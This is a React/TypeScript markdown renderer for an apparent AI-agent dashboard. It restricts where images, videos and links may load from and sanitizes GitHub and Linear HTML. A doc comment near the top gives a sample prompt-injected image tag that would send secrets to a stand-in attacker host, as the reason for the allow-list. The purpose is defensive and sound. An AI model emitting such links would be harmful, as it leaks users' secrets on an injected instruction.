import type { Element, ElementContent } from "hast";
import { type ComponentProps, memo, useContext, useState } from "react";
import ReactMarkdown, { type Components, defaultUrlTransform, type ExtraProps, type Options, type UrlTransform } from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import { TICKET_MEDIA_PATH } from "../../src/shared/tickets";
import { cn } from "@/lib/utils";
import { CodeBlock, CodeBlockActions, CodeBlockContent, CodeBlockCopyButton, CodeBlockHeader, CodeBlockLine, CodeBlockTitle } from "@/components/ui/code-block";
import { highlightLines } from "../code-highlight";
import { githubMediaPath, pullRequestOfUrl, type PullRequestDetail } from "../../src/shared/github";
import { hashForSession } from "../../src/shared/sessions";
import type { UserTodoList } from "../../src/user-todos-shared";
import { linkedFile, remarkFilePaths } from "../file-paths";
import { remarkPromptChips } from "../prompt-tokens";
import { useRead } from "../reads";
import { hashForPullRequests, hashForTickets, hashForTodoId } from "../routing";
import { UserTodosContext } from "./dashboard-context";
import { FileLink } from "./file-link";
import { LocalMedia, MediaStrip } from "./local-media";
import { BrandMark, LINEAR_LOGO, SLACK_LOGO } from "./integrations/brand-logos";
import { OrgIcon } from "./org-icon";
import { type ChipProps, isChipKind, PromptChip } from "./prompt-chip";
import { isVisualLanguage, SessionVisual } from "./session-visual";

/** Where text written on GitHub may load images from directly; its uploads load through `githubMediaPath`. The page's CSP allows the same host. */
const GITHUB_AVATARS = "https://avatars.githubusercontent.com/";

const INLINE_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i;

const inlineImage = (src: string): boolean => INLINE_IMAGE.test(src);
/** A file of a Linear issue, which this server fetches from Linear: the issue's markdown names it so. */
const ticketMedia = (src: string): boolean => src.startsWith(`${TICKET_MEDIA_PATH}?`);
const githubImage = (src: string): boolean => inlineImage(src) || ticketMedia(src) || src.startsWith(GITHUB_AVATARS);

/**
 * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
 * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead. With
 * `local`, as in agent text, a path to an image or video on this computer shows it through `GET /api/media`.
 */
const imageFrom =
	(allowed: (src: string) => boolean, local = false) =>
	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
		const { src, alt } = props;
		if (typeof src !== "string" || src === "") return <>{alt}</>;
		if (allowed(src)) return <img {...props} />;
		const file = local ? linkedFile(src) : null;
		if (file && file.kind !== "text") return <LocalMedia path={file.path} alt={alt ?? ""} />;
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{alt || src}
			</a>
		);
	};

/** An image uploaded to GitHub, which its hosts serve only to a signed-in user; one that fails to load shows as a link to it. */
function GitHubUpload({ url, path, alt, ...props }: ComponentProps<"img"> & { url: string; path: string }) {
	const [failed, setFailed] = useState(false);
	return failed ? (
		<a href={url} target="_blank" rel="noopener noreferrer">
			{alt || url}
		</a>
	) : (
		<img {...props} src={path} alt={alt ?? ""} loading="lazy" onError={() => setFailed(true)} className={cn("max-w-full rounded-lg", props.className)} />
	);
}

const GitHubImage = imageFrom(githubImage);

/** Text written on GitHub: its uploads load through this server, any other image as `githubImage` allows. */
const githubImg: Components["img"] = ({ node: _node, ...props }) => {
	const { src } = props;
	const path = typeof src === "string" ? githubMediaPath(src) : null;
	return path && typeof src === "string" ? <GitHubUpload {...props} url={src} path={path} /> : <GitHubImage {...props} />;
};

/** The `figure` that `remarkFilePaths` ends agent text with: the images and videos it names. Markdown makes no other figure. */
const mediaFigure: Components["figure"] = ({ node }) => {
	const media = node?.properties.dataMedia;
	const paths: unknown = typeof media === "string" ? JSON.parse(media) : null;
	return Array.isArray(paths) ? <MediaStrip paths={paths.filter((path): path is string => typeof path === "string")} /> : null;
};

function ExternalLink({ href, children, ...props }: ComponentProps<"a">) {
	let service: "linear" | "github" | "graphite" | "slack" | null = null;
	let label = "";
	let favicon: string | null = null;
	let titleUrl: string | null = null;
	const bare = children === href || children === href?.replace(/^https?:\/\//, "");
	try {
		const url = new URL(href ?? "");
		if (url.protocol === "https:" || url.protocol === "http:") {
			const host = url.hostname;
			favicon = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(host)}&sz=32`;
			if (host === "linear.app") {
				service = "linear";
				label = url.pathname.match(/\/issue\/([^/]+)/)?.[1] ?? "Linear";
			} else if (host === "github.com" || host === "www.github.com") {
				service = "github";
				const pr = url.pathname.match(/^\/([^/]+)\/([^/]+)\/(?:pull|issues)\/(\d+)/);
				label = pr ? `${pr[1]}/${pr[2]} #${pr[3]}` : url.pathname.split("/").filter(Boolean).slice(0, 2).join("/") || "GitHub";
				const pull = url.pathname.match(/^\/([^/]+)\/([^/]+)\/pull\/(\d+)(?:\/|$)/);
				if (pull) titleUrl = `/api/pull-request/title?${new URLSearchParams({ owner: pull[1]!, repo: pull[2]!, number: pull[3]! })}`;
			} else if (host === "app.graphite.com" || host === "app.graphite.dev") {
				service = "graphite";
				const pr = url.pathname.match(/^\/github\/pr\/([^/]+)\/([^/]+)\/(\d+)/);
				label = pr ? `${pr[1]}/${pr[2]} #${pr[3]}` : "Graphite";
				if (pr) titleUrl = `/api/pull-request/title?${new URLSearchParams({ owner: pr[1]!, repo: pr[2]!, number: pr[3]! })}`;
			} else if (host === "slack.com" || host.endsWith(".slack.com")) {
				service = "slack";
				label = url.pathname.includes("/archives/") ? "Slack message" : "Slack";
			}
		}
	} catch {
		// Relative and filtered URLs keep their original label.
	}
	const title = useRead<Pick<PullRequestDetail, "title">>(bare && !props.title ? titleUrl : null);
	return (
		<a {...props} href={href} target="_blank" rel="noopener noreferrer">
			{favicon ? (
				<>
					{service === "linear" || service === "slack" ? (
						<BrandMark logo={service === "linear" ? LINEAR_LOGO : SLACK_LOGO} className="mr-1 inline-flex size-3 align-middle" />
					) : service ? (
						<OrgIcon org={service} className="mr-1 inline-block align-middle" />
					) : (
						<img src={favicon} alt="" className="mr-1 inline-block size-3 align-middle" loading="lazy" referrerPolicy="no-referrer" />
					)}
					<span className="font-semibold underline">{service && bare ? props.title || title.data?.title || label : children}</span>
				</>
			) : children}
		</a>
	);
}

const link: Components["a"] = ({ node: _node, ...props }) => <ExternalLink {...props} />;

/** A video, from its `src` or its first `<source>`, that plays only a Linear issue's file or one uploaded to GitHub; any other shows as a link to it. */
const video: Components["video"] = ({ node, src: own }) => {
	const source = node?.children.find((child): child is Element => child.type === "element" && child.tagName === "source");
	const src = own ?? source?.properties.src;
	if (typeof src !== "string" || src === "") return null;
	const playable = ticketMedia(src) ? src : githubMediaPath(src);
	if (!playable) {
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{src}
			</a>
		);
	}
	return (
		<video controls preload="metadata" src={playable} className="max-h-[70vh] w-full rounded-md bg-black">
			<a href={src} target="_blank" rel="noopener noreferrer">
				Download the video
			</a>
		</video>
	);
};

/** A link in agent text: a file's path opens in the file dialog, anything else in a new tab. */
const agentLink: Components["a"] = ({ href, children, node: _node, ...props }) => {
	const file = href === undefined ? null : linkedFile(href);
	return file === null ? (
		<ExternalLink {...props} href={href}>{children}</ExternalLink>
	) : (
		<FileLink path={file.path}>{children}</FileLink>
	);
};

/** Where a chip opens in the dashboard; `null` for a skill, command, file, or folder, which have no page of their own, and for a todo not found. */
function chipHref({ kind, label, target }: ChipProps, todos: UserTodoList | null): string | null {
	switch (kind) {
		case "todo":
			return todos && hashForTodoId(todos, target);
		case "session":
			return hashForSession(target);
		case "ticket":
			return hashForTickets(label.slice(0, label.indexOf(" ")));
		case "pull-request": {
			const pr = pullRequestOfUrl(target);
			return pr ? hashForPullRequests(pr) : null;
		}
		case "skill":
		case "command":
		case "file":
		case "directory":
			return null;
		default: {
			const unhandled: never = kind;
			return unhandled;
		}
	}
}

/**
 * A reference in a sent prompt, which `remarkPromptChips` marks; a todo, session, ticket, or pull request opens in the
 * dashboard. Any other `span` stays one.
 */
function PromptChipSpan({ node, ...props }: ComponentProps<"span"> & ExtraProps) {
	const todos = useContext(UserTodosContext);
	const { dataChip: kind, dataLabel: label, dataTarget: target } = node?.properties ?? {};
	if (!isChipKind(kind) || typeof label !== "string" || typeof target !== "string") return <span {...props} />;
	const chip = { kind, label, target };
	const href = chipHref(chip, todos);
	return href === null ? (
		<PromptChip {...chip} />
	) : (
		<a href={href} className="no-underline">
			<PromptChip {...chip} />
		</a>
	);
}

const textOf = (node: Element | ElementContent): string =>
	node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : "";

/** A `<pre>`'s fence language, from its `<code>`'s `language-*` class, and its text. A `<pre>` in GitHub's raw HTML has no `<code>` and no language. */
function fenceOf(node: Element | undefined): { language: string | null; text: string } {
	const code = node?.children.find((child): child is Element => child.type === "element" && child.tagName === "code");
	const className = code?.properties.className;
	const language = (Array.isArray(className) ? className : []).map(String).find(name => name.startsWith("language-"))?.slice("language-".length) ?? null;
	return { language, text: node ? textOf(code ?? node).replace(/\n$/, "") : "" };
}

function CodeLines({ text, language }: { text: string; language: string | null }) {
	return highlightLines(text, language ?? "").map((tokens, index) => (
		<CodeBlockLine key={index}>
			{tokens.map((token, at) => (token.className ? <span key={at} className={token.className}>{token.text}</span> : token.text))}
		</CodeBlockLine>
	));
}

/** A code block, colored by its fence's language, which titles it, with a copy button. */
function FencedCode({ language, text }: { language: string | null; text: string }) {
	const copy = <CodeBlockCopyButton value={text} />;
	return (
		<CodeBlock>
			{language ? (
				<CodeBlockHeader>
					<CodeBlockTitle>{language}</CodeBlockTitle>
					<CodeBlockActions>{copy}</CodeBlockActions>
				</CodeBlockHeader>
			) : (
				<CodeBlockActions>{copy}</CodeBlockActions>
			)}
			<CodeBlockContent>
				<CodeLines text={text} language={language} />
			</CodeBlockContent>
		</CodeBlock>
	);
}

const codeBlock: Components["pre"] = ({ node }) => <FencedCode {...fenceOf(node)} />;

/** In a session's message, a `mermaid` or `chart` fence draws as a diagram or a chart; any other is a code block. */
const sessionCodeBlock: Components["pre"] = ({ node }) => {
	const { language, text } = fenceOf(node);
	if (!isVisualLanguage(language)) return <FencedCode language={language} text={text} />;
	return <SessionVisual language={language} source={text} code={<CodeLines text={text} language={language} />} />;
};

const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage, true), figure: mediaFigure, pre: codeBlock };
const PROMPT_COMPONENTS: Components = { ...AGENT_COMPONENTS, span: PromptChipSpan };
const SESSION_AGENT_COMPONENTS: Components = { ...AGENT_COMPONENTS, pre: sessionCodeBlock };
const SESSION_PROMPT_COMPONENTS: Components = { ...PROMPT_COMPONENTS, pre: sessionCodeBlock };
const GITHUB_COMPONENTS: Components = { a: link, img: githubImg, video, pre: codeBlock };

/** GitHub's schema, plus the `<video>` a Linear issue's recording or a GitHub upload becomes, with its `<source>`. */
const SANITIZE_SCHEMA = {
	...defaultSchema,
	tagNames: [...(defaultSchema.tagNames ?? []), "video", "source"],
	attributes: { ...defaultSchema.attributes, video: ["src"], source: ["src"] },
};

/** react-markdown drops `data:` URLs; the images the page allows inline are the exception. */
const urlTransform = (url: string, key: string): string => (key === "src" && inlineImage(url) ? url : defaultUrlTransform(url));

/**
 * In agent text a `file://` link also keeps its path, which the file dialog opens. One whose escapes do not decode drops
 * as any other unsafe scheme does, since agent text must not throw while the page renders.
 */
const agentUrlTransform = (url: string, key: string): string => {
	if (key !== "href" || !url.startsWith("file:///")) return urlTransform(url, key);
	try {
		return decodeURI(url.slice("file://".length));
	} catch {
		return defaultUrlTransform(url);
	}
};

/** The plugins, components, and URL filter that one kind of text renders with. */
export interface MarkdownPreset {
	remark: NonNullable<Options["remarkPlugins"]>;
	rehype: NonNullable<Options["rehypePlugins"]>;
	components: Components;
	urlTransform: UrlTransform;
}

/**
 * Agent text: the path of a file opens it in the file dialog, a relative one against `FileBaseContext`; an image or
 * video on this computer shows in place when the text writes it as an image, and under the text when it only names it.
 */
export const AGENT_PRESET: MarkdownPreset = { remark: [remarkGfm, remarkFilePaths], rehype: [], components: AGENT_COMPONENTS, urlTransform: agentUrlTransform };

/** A user's prompt, read as agent text with its skill, command, file, ticket, pull request, todo, and session references as chips. */
export const PROMPT_PRESET: MarkdownPreset = { ...AGENT_PRESET, remark: [remarkGfm, remarkPromptChips, remarkFilePaths], components: PROMPT_COMPONENTS };

/** A settled message in a session's conversation: agent text whose `mermaid` and `chart` fences draw as visuals. */
export const SESSION_AGENT_PRESET: MarkdownPreset = { ...AGENT_PRESET, components: SESSION_AGENT_COMPONENTS };

/** A user's prompt in a session's conversation, whose `mermaid` and `chart` fences draw as visuals. */
export const SESSION_PROMPT_PRESET: MarkdownPreset = { ...PROMPT_PRESET, components: SESSION_PROMPT_COMPONENTS };

/**
 * Text written on GitHub or Linear, whose raw HTML renders as GitHub renders it, through rehype-sanitize's schema, which
 * follows GitHub's; HTML comments drop out, as GitHub hides them. Images load from GitHub's hosts and from this
 * server's route for a Linear issue's files, which also plays its videos.
 */
export const GITHUB_PRESET: MarkdownPreset = { remark: [remarkGfm], rehype: [rehypeRaw, [rehypeSanitize, SANITIZE_SCHEMA]], components: GITHUB_COMPONENTS, urlTransform };

/**
 * Markdown text is untrusted. react-markdown escapes raw HTML and filters unsafe link schemes, and images load only
 * inline (`data:`) or from where the preset allows.
 *
 * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice.
 */
export const MessageMarkdown = memo(function MessageMarkdown({ text, preset = AGENT_PRESET }: { text: string; preset?: MarkdownPreset }) {
	return (
		<div className="message-markdown max-w-full whitespace-normal break-words">
			<ReactMarkdown remarkPlugins={preset.remark} rehypePlugins={preset.rehype} components={preset.components} urlTransform={preset.urlTransform}>
				{text}
			</ReactMarkdown>
		</div>
	);
});
